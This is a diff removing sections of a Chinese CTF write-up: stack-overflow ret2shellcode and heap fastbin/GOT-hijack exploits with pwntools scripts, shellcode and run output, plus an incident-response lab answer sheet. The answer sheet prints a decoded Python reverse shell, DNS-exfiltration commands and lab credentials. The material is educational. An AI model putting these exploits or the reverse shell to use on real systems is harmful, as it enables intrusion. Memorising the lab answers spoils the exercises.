-  printf("check it, %s\n", dup)    // [3] 打印内容 → 泄露栈地址
-  return dup
-
-main (0x400863):
-  sub rsp, 0x50                    // 80字节局部变量
-  call get_input                   // 获取输入
-  puts("EASY PWN PWN PWN~")
-  scanf("%s", rbp-0x50)            // [4] 栈溢出！0x50+8=88字节到ret
-  puts("bye~")
-  leave; ret
-```
-
-**栈布局：**
-
-```
-get_input 栈帧:                main 栈帧:
-  rbp-0x20: read buf (32B)       rbp-0x50: scanf buf (80B)
-  rbp+0x00: saved rbp ← 泄露    rbp+0x00: saved rbp
-  rbp+0x08: ret addr             rbp+0x08: ret addr ← 溢出目标
-```
-
-### 漏洞分析
-
-**漏洞1：栈地址泄露（get_input）**
-
-`read(0, buf, 0x20)` 读取恰好 32 字节，不添加 null 终止符。随后 `strdup(buf)` 会从栈缓冲区持续复制直到遇到 null 字节。如果输入 32 个非 null 字节，`strdup` 会读取到缓冲区之后的 `saved rbp`（栈地址），然后 `printf("%s")` 将其打印出来。
-
-```
-输入: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  (32个'A')
-strdup读取: [32字节输入][6-8字节saved rbp][3字节ret addr遇到0x00停止]
-printf输出: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<saved_rbp_bytes>
-```
-
-**漏洞2：栈溢出（main 的 scanf）**
-
-`scanf("%s", rbp-0x50)` 无长度限制，`%s` 读取直到空白字符。缓冲区 80 字节，saved rbp 8 字节，返回地址 8 字节。溢出偏移 = 0x50 + 8 = **88 字节**。
-
-**scanf 坏字节限制：**
-
-`scanf("%s")` 在以下字符处停止：`0x09`(tab) `0x0a`(newline) `0x0b`(vtab) `0x0c`(formfeed) `0x0d`(cr) `0x20`(space)
-
-这导致关键 gadget 地址不可用：
-
-| Gadget | 地址 | 坏字节 | 可用 |
-|--------|------|--------|------|
-| `pop rdi; ret` | 0x400923 | 0x09 | ❌ |
-| `call rsp` | 0x4009a3 | 0x09 | ❌ |
-| `ret` | 0x400611 | 无 | ✅ |
-| `leave; ret` | 0x4008b2 | 无 | ✅ |
-| `jmp rax` | 0x400715 | 无 | ✅ |
-
-> **关键**：由于 `pop rdi; ret` 地址含 0x09，无法通过 scanf payload 使用 ret2libc。但 NX 关闭意味着可以直接在栈上执行 shellcode——只要能泄露栈地址。
-
-### 攻击策略：两阶段 Ret2Shellcode
-
-**Phase 1：泄露栈地址**
-
-```
-[get_input 阶段]
-  发送: 32个非null字节 (如 'A'*32)
-  read() 读入32字节到 rbp-0x20
-  strdup() 读取到 saved rbp → printf 输出
-  
-  解析输出:
-    leaked = "AAAA...AAAA" + saved_rbp_bytes
-    saved_rbp = leaked[32:40]  → main 的 rbp值
-    scanf_buf = saved_rbp - 0x50  → scanf 缓冲区地址
-```
-
-**Phase 2：Shellcode 注入**
-
-```
-[scanf 阶段]
-  Payload = [shellcode(26B)] + [padding(62B)] + [ret_addr(8B)]
-            ↑                        ↑               ↑
-            scanf_buf地址          填充至88字节      p64(scanf_buf)
-```
-
-scanf 读入 payload，shellcode 存放在栈上 scanf_buf 处。当 main 返回时，跳转到 scanf_buf 执行 shellcode。
-
-**Shellcode（execve("//bin/sh", NULL, NULL)，26字节）：**
-
-```asm
-xor rsi, rsi                      ; argv = NULL
-push rsi                           ; null terminator
-movabs rdi, 0x68732f6e69622f2f    ; "//bin/sh" (避免null字节)
-push rdi
-mov rdi, rsp                       ; rdi = ptr to string
-push 59                            ; sys_execve
-pop rax
-xor rdx, rdx                      ; envp = NULL
-syscall
-```
-
-> **技巧**：使用 `"//bin/sh"` 而非 `"/bin/sh"` 是因为 `movabs rdi, imm64` 中的立即数不能含 null 字节。`"/bin/sh\0"` 末尾有 0x00，而 `"//bin/sh"` 的 8 字节编码 `2f 2f 62 69 6e 2f 73 68` 完全无 null。
-
-### 解题过程
-
-```python
-from pwn import *
-
-# Phase 1: 泄露栈地址
-p = remote(host, port, ssl=True)
-p.recvuntil(b'well you input:\n')
-p.send(b'A' * 32)                    # 32字节，无null终止
-p.recvuntil(b'check it, ')
-leaked = p.recvuntil(b'\n', drop=True)
-saved_rbp = u64(leaked[32:40].ljust(8, b'\x00'))
-scanf_buf = saved_rbp - 0x50
-
-# Phase 2: shellcode溢出
-p.recvuntil(b'EASY PWN PWN PWN~')
-payload = shellcode + b'B' * (88 - len(shellcode)) + p64(scanf_buf)
-p.sendline(payload)
-
-# Phase 3: getshell
-p.recvuntil(b'bye~')
-p.sendline(b'cat /flag*')
-# → CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
-```
-
-**运行结果：**
-
-```
-[Phase 1] Leaking stack address...
-  Saved RBP (main's rbp): 0x00007ffcc505b340
-  Scanf buffer: 0x00007ffcc505b2f0
-  Address is clean!
-
-[Phase 2] Sending shellcode + overflow...
-  Payload is clean! (96 bytes)
-  Shellcode at: 0x00007ffcc505b2f0
-
-[Phase 3] Getting shell...
-  Got 'bye~', shellcode executing...
-  CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
-```
-
-Flag: `CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| scanf 栈溢出 | `scanf("%s")` 无长度限制，`%s` 遇空白字符停止，需注意坏字节 |
-| read 无终止符泄露 | `read()` 不添加 null 终止符，`strdup`/`printf("%s")` 会读取到栈上额外数据 |
-| 栈地址泄露 | 通过 `strdup` 越界读取 `saved rbp` 泄露栈地址，计算 scanf 缓冲区位置 |
-| NX 关闭 + Ret2Shellcode | 栈可执行时，直接将 shellcode 写入栈并跳转执行 |
-| scanf 坏字节绕过 | `0x09` 导致 `pop rdi;ret` 不可用 → 改用直接跳转 shellcode 绕过 |
-| shellcode 无 null 技巧 | 使用 `"//bin/sh"` 替代 `"/bin/sh"` 避免 `movabs` 中的 null 字节 |
-| GNU_STACK 权限 | `GNU_STACK` 的 `flags=XWR` 表示栈可读可写可执行 |
-
-> **技巧**：当 `scanf("%s")` 坏字节阻止使用 `pop rdi; ret` 等关键 gadget 时，如果 NX 关闭，可以直接走 Ret2Shellcode 路线：①通过 `read`+`strdup`+`printf` 链泄露栈地址 → ②在 scanf 缓冲区放置 shellcode → ③覆盖返回地址跳到 shellcode。这比 ret2libc 更直接，不需要 libc 地址。
-
-> **技巧**：`strdup` 是一个隐蔽的泄露原语。它从源地址持续复制直到 null 字节，如果源缓冲区没有 null 终止，就会读到栈上的 `saved rbp`（栈地址）和返回地址（代码段地址）。配合 `printf("%s")` 可以无格式化字符串漏洞就实现信息泄露。
-
-> **技巧**：Windows 上 pwntools 的 `asm()` 需要 `binutils`，如果没有安装可以直接使用预编译的 shellcode 字节序列。用 `capstone` 或在线工具（如 shell-storm.org）编译。
-
-### 同类变体与扩展
-
-- **ASLR 影响**：每次运行栈地址不同，所以必须每次泄露。本题通过 Phase 1 动态泄露解决
-- **scanf 坏字节变体**：如果目标地址含 0x0a（`\n`），scanf 也会停止。可以在 shellcode 中加 NOP sled 并调整跳转地址避开
-- **ret2libc 备选**：如果 NX 开启，可以尝试：①利用 `jmp rax`(0x400715) 配合 puts 返回值 → ②`leave;ret` 做栈迁移到 .bss → ③在 .bss 布置 ROP 链（但 .bss 不可执行，需要 ret2libc）
-- **one_gadget**：如果能泄露 libc，使用 `one_gadget` 工具找一键 RCE 地址，无需 `pop rdi`
-- **防御建议**：开启 NX（`-z noexecstack`）、Canary（`-fstack-protector-all`）、PIE（`-fPIE`）、Full RELRO（`-z relro -z now`），使用 `fgets` 替代 `scanf`
-
-### 解题脚本
-
-完整脚本：[PWN/06-bypwn/exploit.py](PWN/06-bypwn/exploit.py)
-
-反编译分析：[PWN/06-bypwn/decompiled.txt](PWN/06-bypwn/decompiled.txt)
-
----
-
-## 第22题：easyheap — 堆溢出 + Fastbin Attack + GOT 劫持
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | PWN - 堆利用（Heap Exploitation） |
-| 难度 | 中等 |
-| 日期 | 2026-08-02 |
-| 远程地址 | `ncat --ssl 7ce2ae89db34ba28434d328c.tcp-ctf2.dasctf.com 9999` |
-| Flag | `CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}` |
-
-### 二进制保护
-
-| 保护 | 状态 | 说明 |
-|------|------|------|
-| Canary | ✅ 开启 | 堆操作函数有栈保护 |
-| NX | ✅ 开启 | 栈不可执行 |
-| PIE | ❌ 关闭 | 地址固定 |
-| RELRO | Partial | GOT 可写（关键！） |
-
-### 程序结构
-
-菜单驱动的堆管理器：
-
-```
-1. Create a Heap   — malloc(size) + read_input(heap, size)
-2. Edit a Heap     — read new_size + read_input(heap, new_size)  ← 漏洞！
-3. Delete a Heap   — free(heap) + heaparray[i] = NULL  ← 安全
-4. Exit
-```
-
-隐藏功能：输入 `4869`（0x1305）检查 BSS 变量 `magic` > 0x1305 时调用后门 `l33t()`。
-
-### 漏洞分析
-
-**edit_heap 堆溢出（核心漏洞）**：
-
-```c
-void edit_heap() {
-    int index = read_int("Index :");
-    // 边界检查 OK
-    if (heaparray[index] == NULL) { puts("No such heap!"); return; }
-    int new_size = read_int("Size of Heap :");  // ← 用户可控的新 size！
-    read_input(heaparray[index], new_size);      // ← 写入超过原始 malloc 大小！
-}
-```
-
-> ⚠️ **关键漏洞**：`edit_heap` 允许用户重新输入 size，但写入的是**已有堆块**。如果新 size > 原 malloc size，就会溢出到相邻堆块的 metadata。
-
-**delete_heap 安全**：free 后正确置 NULL，无 UAF。
-
-**后门函数 l33t()**：`system("cat /home/pwn/flag")` — 但远程 flag 在 `/flag`，路径错误！
-
-### 利用策略：Fastbin Attack → atoi@GOT → system → Shell
-
-由于后门路径错误，不能直接触发 `l33t()`。改用 **Fastbin Attack 劫持 GOT 表** 获取 shell。
-
-#### GOT 目标
-
-| 函数 | PLT 地址 | GOT 地址 | 用途 |
-|------|----------|----------|------|
-| system | 0x400700 | 0x602038 | 替换目标值 |
-| atoi | 0x400760 | 0x602068 | 被劫持的 GOT 入口 |
-
-> **技巧**：main 循环中 `atoi(user_input)` 将用户输入转为 menu choice。如果将 `atoi@GOT` 覆写为 `system@PLT`，输入 `"/bin/sh"` 就会执行 `system("/bin/sh")`。
-
-#### Fastbin Attack 原理（glibc 2.23，无 tcache）
-
-1. **free chunk1 → fastbin[0x70]**：`fastbin_head → chunk1 → NULL`
-2. **溢出 chunk0 → 篡改 chunk1.fd**：`fastbin_head → chunk1 → fake_chunk → NULL`
-3. **malloc 两次**：第一次弹出 chunk1，第二次弹出 fake_chunk
-4. fake_chunk 定位在 BSS 中，利用 `stdout` 的 libc 地址作为 fake size（0x7f）
-
-#### Fake Chunk 构造（0x7f size 技巧）
-
-```
-BSS 布局：
-  0x6020a0: stdout (libc FILE* 指针，形如 0x00007fXXXXXXXXXX)
-  0x6020e0: heaparray[0..9]
-
-stdout 的 libc 地址第 6 字节（偏移 +5）为 0x7f。
-构造 fake chunk 在 0x60209d：
-  0x60209d + 0x08 = 0x6020a5 → 该位置读出的 qword = 0x000000000000007f
-  fastbin_index(0x7f & ~0x7) = fastbin_index(0x78) = (0x78 >> 4) - 2 = 5
-  fastbin_index(0x70) = (0x70 >> 4) - 2 = 5  ← 相同！glibc 2.23 的检查通过！
-```
-
-> ⚠️ **技巧**：glibc 2.23 的 fastbin 检查是 `fastbin_index(chunksize(victim)) == idx`，而 `fastbin_index(0x78) == fastbin_index(0x70) == 5`，所以 0x7f 可以伪装成 0x70 的 fastbin chunk。这是 House of Spirit 技巧的经典应用。
-
-#### 完整利用步骤
-
-```
-Step 1: create(0x68, 'A'*0x68)  → chunk0 @ heap+0x00 (size 0x70)
-        create(0x68, 'B'*0x68)  → chunk1 @ heap+0x70 (size 0x70)
-        create(0x18, 'C'*0x18)  → chunk2 @ heap+0xe0 (guard)
-
-Step 2: free(1) → fastbin[0x70]: chunk1 → NULL
-
-Step 3: edit(0, 0x78, payload)
-        payload = 'A'*0x60        ← chunk0 数据
-                + p64(0)           ← chunk1 prev_size
-                + p64(0x71)        ← chunk1 size（保持不变）
-                + p64(0x60209d)    ← chunk1.fd → fake BSS chunk
-
-Step 4: create(0x68, 'D') → 弹出 chunk1
-        fastbin[0x70]: fake_chunk(0x60209d) → NULL
-
-Step 5: create(0x68, fake_data) → 弹出 fake_chunk，返回 0x6020ad
-        fake_data = '\x00'*0x33          ← 填充到 heaparray[0]
-                  + p64(0x602068)         ← heaparray[0] = atoi@GOT
-
-        现在 heaparray[0] 指向 atoi@GOT！
-
-Step 6: edit(0, 8, p64(0x400700))
-        → write(atoi@GOT, system@PLT)
-        → atoi 现在是 system！
-
-Step 7: sendline("/bin/sh")  → atoi("/bin/sh") → system("/bin/sh") → SHELL!
-
-Step 8: cat /flag → CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}
-```
-
-### 备选方案：Unsorted Bin Attack（验证后门但 flag 路径错误）
-
-另一种利用方式是 **Unsorted Bin Attack** 写入 `magic` 变量：
-
-1. create(0x18) + create(0x80) + create(0x10 guard)
-2. free(1) → unsorted bin（chunk_size 0x90 > fastbin 范围）
-3. edit(0, 0x30) 溢出 → 设置 chunk1.bk = 0x6020b0（magic - 0x10）
-4. create(0x80) → 精确匹配 → `bck->fd = unsorted_chunks(av)` 写入 magic
-5. 输入 4869 → magic > 0x1305 → l33t() → `system("cat /home/pwn/flag")`
-
-> ⚠️ **陷阱**：此方案成功触发后门（输出 "Congrt !"），但 `system("cat /home/pwn/flag")` 报告 "No such file or directory"——flag 实际在 `/flag`，不在 `/home/pwn/flag`。这是出题人的"坑"，需要获取 shell 才能找到正确路径。
-
-### 远程 glibc 版本判断
-
-- 远程 glibc 2.23（无 tcache）：Unsorted Bin Attack 和 Fastbin Attack 均可用
-- WSL glibc 2.31（有 tcache）：Tcache Poisoning 方案可用（本地验证），但 Unsorted Bin Attack 失败（有 "unsorted double linked list corrupted" 检查）
-
-### 关键知识点
-
-1. **Fastbin Attack**：通过溢出篡改 freed chunk 的 fd 指针，使 malloc 返回任意地址
-2. **0x7f fake size 技巧**：利用 libc 地址的高位 0x7f 字节作为 fake chunk size，绕过 glibc 2.23 的 fastbin index 检查
-3. **GOT 劫持**：Partial RELRO 下 GOT 可写，覆写 `atoi@GOT` 为 `system@PLT` 实现任意命令执行
-4. **Unsorted Bin Attack**：篡改 freed chunk 的 bk 指针，在 malloc 时触发 `bck->fd = unsorted_chunks(av)`，向目标地址写入 libc 地址
-5. **House of Spirit**：在目标区域构造 fake chunk，通过 fastbin 返回该区域地址
-
-### 同类变体与扩展
-
-- **tcache 版本（glibc 2.27+）**：不需要 fake size，直接覆写 tcache next 指针即可。注意 glibc 2.32+ 有 safe-linking 保护（next 指针异或加密）
-- **无 system@plt**：如果没有 system 的 PLT，可通过 unsorted bin leak libc → 计算 system 真实地址 → 覆写 `__free_hook` 或 `__malloc_hook`
-- **Full RELRO**：如果 GOT 不可写，改用 `__free_hook` / `__malloc_hook` 覆写
-- **防御建议**：开启 Full RELRO（`-z relro -z now`）、使用 tcache safe-linking、对 edit 操作进行 size 校验
-
-### 解题脚本
-
-完整脚本：[PWN/07-easyheap/exploit.py](PWN/07-easyheap/exploit.py)
-
-反编译分析：[PWN/07-easyheap/decompiled.txt](PWN/07-easyheap/decompiled.txt)
 
 ---
 
@@ -5046,669 +5803,6 @@ systemctl list-unit-files --state=enabled
 > AI生成
 
 ---
-## 第28题：PWN - testpwn (Warm Up) — SSL + ret2text 自动化利用
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 类型 | PWN |
-| 题目 | testpwn (Warm Up) |
-| 来源 | DASCTF |
-| 靶机 | `ncat --ssl 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com 9999` |
-| Flag | `CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}` |
-
-### 解题过程
-
-#### 1. 关键发现：靶机使用 SSL/TLS
-
-靶机地址以 `.tcp-ctf2.dasctf.com` 结尾，平台提示连接方式为 `ncat --ssl`，说明服务端使用 SSL/TLS 加密。pwntools 的 `remote()` 默认不走 TLS，需要加 `ssl=True` 参数。
-
-#### 2. 静态分析（PWN Arcanum 自动完成）
-
-```
-Arch: amd64 (64-bit, little)
-NX: False    Canary: False    PIE: False    RELRO: Partial
-
-危险函数: gets@0x400500, sprintf@0x400510
-Win函数: system@0x4004d0
-Cat-flag gadget: mov edi, 0x400734 [cat flag] @ 0x400611
-自动偏移: 72 bytes (lea rdi,[rbp-0x48] + call gets)
-ROP gadgets: pop rdi; ret @0x400713, ret @0x4004a1
-```
-
-#### 3. 自动策略推荐
-
-工具自动推荐 ret2text（优先级95）：发现内联 `system("cat flag")` 在 `0x400611`。
-
-#### 4. 自动 payload 构建
-
-```
-ret2text: overflow 72 bytes -> call cat_flag_gadget@0x400611
-Payload: 96 bytes
-  0000: 41*72 (padding) + a1 04 40 00 (ret对齐) + 11 06 40 00 (gadget) + ef be ad de (fake ret)
-```
-
-#### 5. 远程利用（SSL模式）
-
-```bash
-python pwn_arcanum.py testpwn --remote 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com:9999 --ssl --no-interactive
-```
-
-输出：
-```
-Banner: -Warm Up-
-Sending payload (96 bytes) ...
-cat-flag gadget detected, waiting for output ...
-
-Output:
-WOW:0x40060d
->CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
-timeout: the monitored command dumped core
-
-[FLAG] CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
-```
-
-### 知识点
-
-1. **DASCTF 平台 SSL 靶机**：域名含 `.tcp-ctf2.` 的靶机需要 `ncat --ssl` 或 pwntools `ssl=True`
-2. **ret2text + cat flag gadget**：gets 栈溢出覆盖返回地址，跳转到 `system("cat flag")`
-3. **ret 对齐**：x64 ABI 要求 16 字节栈对齐，在 gadget 前加一个 `ret` 指令
-4. **gets 需要 \n**：pwntools 用 `sendline()` 而非 `send()`，因为 `gets()` 读到 `\n` 才返回
-
-### 工具
-
-- PWN Arcanum v1.3：`PWN/pwn-arcanum/pwn_arcanum.py`
-- 一键复现：`python pwn_arcanum.py testpwn --remote HOST:PORT --ssl --no-interactive`
-
-> AI生成
-
----
-
-
-## 第29题：帕鲁杯应急响应挑战赛 — 多组件综合IR实战
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | IR - 多组件综合应急响应（Web+数据库+堡垒机+监控+办公区） |
-| 赛事 | 第一届帕鲁杯CTF应急响应挑战赛 |
-| 承办 | 知攻善防实验室 + One-Fox安全团队 |
-| 目标网段 | 192.168.20.0/24 |
-| 完成日期 | 2026-08-03 |
-| 总题数 | 52道子题（含5个FLAG验证） |
-
-### 资产清单
-
-| 区域 | 服务器名称 | IP地址 | 系统登录信息 | 应用/服务 |
-|------|-----------|--------|-------------|----------|
-| DMZ区 | WEB Server | 192.168.20.121 | home/home1234!!! | Discuz! X3.5, Spring Boot(8080) |
-| DMZ区 | WAF Server | 192.168.20.123 | home/home1234!!! | SafeLine WAF 5.2.0 (9443) |
-| 安全运维区 | JumpServer | 192.168.20.11 | - | JumpServer v3.10.6 (8080) |
-| 安全运维区 | Zabbix Server | 192.168.20.12 | home/home1234!!! | Zabbix (通过WAF 9002端口) |
-| 数据存储区 | MYSQL Server 1 | 192.168.20.51 | mysql/mysql1234!!! | MySQL (3306) - palu_ctf, ultrax |
-| 数据存储区 | MYSQL Server 2 | 192.168.20.52 | mysql/mysql1234!!! | MySQL (3306) - zabbix |
-| 办公区 | PC01 | 192.168.20.201 | Administrator/Network@2020 | Windows |
-| 办公区 | PC02 | 192.168.20.202 | Administrator/Network@2020 | Windows |
-
-**WAF管理界面**: https://192.168.20.123:9443/ （admin / mQzm7LqF）
-
-**JumpServer**: http://192.168.20.123:8080 （admin / Network@2020）
-
-**WAF保护的4个站点**:
-
-| 站点 | WAF端口 | 后端地址 |
-|------|---------|---------|
-| WebServer | 80 | http://192.168.20.121/ |
-| JumpServer | 8080 | http://192.168.20.11 |
-| Zabbix | 9002 | http://192.168.20.12/ |
-| FastJson | 7878 | http://192.168.20.121:8080/ |
-
-### 全部题目与FLAG/答案
-
-#### 签到 / 基础排查
-
-| # | 题目 | 答案 | 来源 |
-|---|------|------|------|
-| 1 | 堡垒机中flag标签的值 | **BrYeaVj54009rDIZzu4O** | JumpServer标签列表 |
-| 2 | 攻击者第一次登录时间 | **2024/04/11/14:21:18** | JumpServer登录日志 |
-| 3 | 攻击者源IP | **192.168.1.4** | JumpServer审计日志 |
-| 4 | 攻击者使用的CVE编号 | **CVE-2024-29201** | JumpServer漏洞利用 |
-| 5 | Web服务器上恶意程序的32位小写MD5 | **84413332e4e7138adc5d6f1f688ddd69** | WebServer恶意文件md5sum |
-| 6 | 恶意程序连接地址和密码 | 连接: 待排查 / 密码: 待排查 | pyc反编译 |
-| 7 | 存在反序列化漏洞的端口 | **8080** | WAF攻击记录筛选 |
-| 8 | 攻击者使用的后门路由地址 | **/api/system** | WAF筛选路径api |
-| 9 | dnslog反弹域名 | **0vqkht.palu.cn** | WebServer log.txt |
-| 10 | 第一次扫描器使用时间 | 待排查 | WAF攻击记录 |
-| 11 | 攻击者反弹shell使用的语言 | **python** | Zabbix脚本分析 |
-| 12 | 攻击者反弹shell的IP | **82.157.238.174** | Zabbix脚本审计 |
-| 13 | 攻击者留下的账号 | **hacktest** | WebServer /etc/passwd |
-| 14 | 攻击者的后门账户密码 | **123123** | /etc/shadow john爆破 |
-| 15 | 测试数据条数 | **5** | 数据库 |
-| 16 | 攻击者留下的信息 | **flag{hi_palu_f10g}** | 日志中发现hacktest |
-| 17 | 运维服务器上的恶意文件MD5小写32 | 待排查 | Zabbix Server文件 |
-| 18 | 恶意文件的恶意函数 | **begingame** | IDA逆向helloworld |
-| 19 | 攻击者恶意注册的恶意用户条数 | **10** | Discuz kongzi系列用户 |
-| 20 | 对博客系统的第一次扫描时间 | 待排查 | WAF记录 |
-| 21 | 攻击者下载的文件 | **upload.zip** | WebServer访问日志 |
-| 22 | 攻击者第一次下载的时间 | **16/Apr/2024:09:03:52** | WebServer访问日志 |
-| 23 | 攻击者留下的冰蝎马的文件名称 | **nidewen.php** | WebServer html/api目录 |
-| 24 | 冰蝎的链接密码 | **1be873048db838ac** (nidewen) | 冰蝎马内容 |
-| 25 | 办公区存在的恶意用户名 | **hacker** | PC01 net user |
-| 26 | 恶意用户密码到期时间 | 待排查 | PC01 net user |
-| 27 | 内存疑似恶意进程 | **hack.ex** | PC01 volatility pslist |
-| 28 | 员工使用的公司OA平台密码 | **liuling7541** | PC01内存取证 |
-| 29 | 木马文件名 | **h4ck3d!** | PC01剪贴板 |
-| 30 | 重要联系人的家庭住址 | **秋水省雁荡市碧波区千屿山庄1号** | PC01联系人 |
-| 31 | 近源靶机上的恶意文件哈希 | **a7fcd0b15a080167c4c2f05063802a6e** | PC02 artifact.exe |
-| 32 | 恶意程序的外联地址 | **101.78.63.44** | PC02沙箱分析 |
-| 33 | 攻击者使用内网扫描工具的哈希 | 待排查 | PC02 fscan |
-| 34 | 攻击者在站点上留下的后门密码 | **123** | WAF站点 |
-| 35 | 攻击者在数据库留下的信息 | **flag{hack_palu}** | MySQL ultrax.pre_ucenter_vars |
-| 36 | 监控服务器上dcnlog地址 | **palu.dcnlog.cn** | Zabbix脚本 |
-| 37 | 监控服务器上恶意用户的上一次登录时间 | 待排查 | Zabbix用户 |
-| 38 | 监控服务器上遗留的反弹shell地址和端口 | **154.183.110.12:7890** | Zabbix脚本base |
-| 39 | 恶意钓鱼文件的哈希 | 待排查 | JumpServer上传日志 |
-| 40 | 恶意文件外联IP | 待排查 | PC02 |
-| 41 | 被恶意文件钓鱼使用者的姓名 | **陈琚鹭** | JumpServer会话监控 |
-| 42 | 攻击者留下的信息 | 待排查 (注册表字符串) | PC02注册表 |
-| 43 | 恶意用户数量 | **49** | PC02 net user |
-| 44 | 员工集体使用的密码 | **Network@2020** | PC02 |
-| 45 | 加密文件的哈希 | 待排查 | PC02 encode.txt |
-| 46 | 被攻击者加密的内容明文 | **2024ispassword** | 玛卡巴卡解密 |
-| 47 | 符合基线标准的服务器数量 | **md5(0)** | 基线检查 |
-| 48 | 办公区的恶意文件哈希 | 待排查 | PC01 palucomeyi1.exe |
-| 49 | 恶意回连端口 | **22** | PC01恶意程序 |
-| 50 | 恶意程序中的flag | **flag{234567uyhgn_aiduyai}** | pyc反编译 |
-| 51 | 恶意文件中的search_for_text内容 | **passwod** | pyc反编译 |
-| 52 | Web服务器上攻击者修改后的root密码 | 待排查 (john爆破shadow) | WebServer /etc/shadow |
-
-#### 实际环境验证发现的FLAG
-
-| FLAG | 来源 | 说明 |
-|------|------|------|
-| **BrYeaVj54009rDIZzu4O** | JumpServer标签列表 | 名称=flag, 值=BrYeaVj54009rDIZzu4O |
-| **flag{hack_palu}** | MySQL Server 1 ultrax.pre_ucenter_vars | name字段 |
-| **flag{hi_palu_f10g}** | WebServer日志 hacktest | 攻击者留下 |
-| **flag{234567uyhgn_aiduyai}** | PC01恶意程序pyc | SSH上传恶意程序 |
-| **CVE-2024-29201** | JumpServer漏洞 | 攻击者利用的CVE |
-
-### 攻击链还原
-
-#### Phase 1: Web应用攻击 (2024-04-17 08:59)
-- **攻击者IP**: 192.168.20.121 (WebServer自身，可能是被控后的横向扫描)
-- **攻击方式**: 大规模自动化扫描 (181条WAF记录)
-  - SQL注入 (m_sqli)
-  - PHP代码注入 (m_php_code_injection)
-  - PHP反序列化 (m_php_unserialize)
-  - 文件包含 (m_file_include)
-  - 命令注入 (m_cmd_injection)
-- **WAF状态**: 全部拦截 (action=1)
-
-#### Phase 2: PHP代码注入攻击 (2024-04-17 10:21)
-- **攻击者IP**: 192.168.20.77
-- **攻击方式**: PHP代码注入
-  - `/?123=system("ls");` - 列目录
-  - `/?123=system("cat admin.php");` - 读取admin文件
-- **时间**: 2024-04-17 10:21:13 ~ 10:22:04
-- **WAF状态**: 全部拦截
-
-#### Phase 3: Zabbix后门植入
-- **恶意用户**: palu (UserID: 3, Name: palu palu)
-- **恶意脚本**:
-
-| 脚本名 | ID | 命令 | 用途 |
-|--------|-----|------|------|
-| hack | 4 | `ping user.\`whoami\`.palu.dcnlog.cn` | DNS外带 - 获取当前用户名 |
-| hack1 | 5 | `ping user.\`python3\`.palu.dcnlog.cn` | DNS外带 - 确认python3可用 |
-| hack2/base | 6 | 反向Shell到 154.183.110.12:7890 (后改为 82.157.238.174:7890) | 远程控制 |
-
-- **base脚本解码**:
-```python
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("154.183.110.12",7890))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-import pty
-pty.spawn("sh")
-```
-
-- **DNS外带域名**: palu.dcnlog.cn
-
-#### Phase 4: JumpServer横向移动
-- **攻击者IP**: 192.168.1.4 (通过JumpServer外部连接)
-- **时间线**:
-  - 2024-04-17 12:49 - MySQL连接 (MysqlDatabase01/02)
-  - 2024-04-17 12:54 - Zabbix SSH连接 (home账号, 10条命令, 21分钟)
-  - 2024-04-17 12:54 - Zabbix SFTP文件传输
-  - 2024-04-17 13:05-14:58 - MySQL数据库操作 (查询zabbix数据库表)
-  - 2024-04-17 14:13-15:05 - PC02 RDP连接 (26+9条命令, 约78分钟)
-  - 攻击者在PC02上执行: `net user`, `cmd`, `md5`, `encode`等命令
-  - 攻击者在MySQL上执行: SELECT查询zabbix数据库多张表
-
-### 关键证据
-
-**WAF攻击记录 (SafeLine WAF)**:
-- 总记录数 7535条
-- API路径: /api/open/auth/csrf (GET) -> /api/open/auth/login (POST)
-- 攻击记录API: /api/open/records
-- 主要攻击类型: m_sqli / m_php_code_injection / m_cmd_injection / m_file_include / m_php_unserialize / m_xss / m_scanner
-
-**Zabbix恶意脚本证据 (MySQL Server 2)**:
-```sql
--- 恶意用户
-SELECT * FROM zabbix.users WHERE username='palu';
--- userid=3, username=palu, name=palu, surname=palu
-
--- 恶意脚本
-SELECT scriptid, name, command FROM zabbix.scripts WHERE name IN ('hack','hack1','base');
--- scriptid=4, name=hack, command=ping user.`whoami`.palu.dcnlog.cn
--- scriptid=5, name=hack1, command=ping user.`python3`.palu.dcnlog.cn
--- scriptid=6, name=base, command=<base64 encoded reverse shell>
-
--- 审计日志
-SELECT clock, action, details FROM zabbix.auditlog WHERE username LIKE '%palu%';
--- 2024-04-17 13:29~13:33: palu用户登录、创建恶意脚本、更新用户权限
-```
-
-**Discuz数据库被篡改 (MySQL Server 1)**:
-```sql
-SELECT * FROM ultrax.pre_ucenter_vars WHERE name LIKE '%flag%';
--- name=flag{hack_palu}, value=0
-```
-
-**Discuz用户信息**:
-
-| 用户名 | 邮箱 |
-|--------|------|
-| admin | admin@admin.com |
-| kongzi (x10) | kongzi@palu.com |
-| paluhome | palu@palu.com |
-| helloctf | helloctf@palu.com |
-
-**JumpServer审计记录**:
-- 2837条命令记录
-- 13条历史会话记录
-- 攻击者从 192.168.1.4 通过JumpServer操作了Pc02(RDP)、MySQL、Zabbix(SSH/SFTP)
-
-### 攻击者信息汇总
-
-| 项目 | 信息 |
-|------|------|
-| 攻击者IP (Web层) | 192.168.20.77 |
-| 攻击者IP (内网扫描) | 192.168.20.121 |
-| 攻击者IP (JumpServer) | 192.168.1.4 |
-| DNS外带域名 | palu.dcnlog.cn / 0vqkht.palu.cn |
-| 反向Shell C2 #1 | 154.183.110.12:7890 |
-| 反向Shell C2 #2 | 82.157.238.174:7890 |
-| PC02恶意程序外联IP | 101.78.63.44 |
-| Zabbix后门用户 | palu |
-| 最早攻击时间 | 2024-04-17 08:59:31 |
-| 攻击者CVE | CVE-2024-29201 (JumpServer) |
